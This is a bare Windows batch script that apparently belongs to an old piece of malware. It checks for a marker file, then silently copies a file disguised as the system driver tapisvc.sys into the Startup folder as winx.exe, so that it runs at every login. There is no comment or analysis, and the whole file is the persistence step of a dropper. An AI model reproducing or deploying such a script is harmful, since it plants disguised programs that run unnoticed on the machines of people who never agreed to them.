@echo off
:s
@if exist "C:\WINDOWS\OleFiles\winx.exe" goto f
@copy "C:\WINDOWS\SYSTEM\tapisvc.sys" "C:\WINDOWS\Start Menu\Programs\Startup\winx.exe" > nul
:f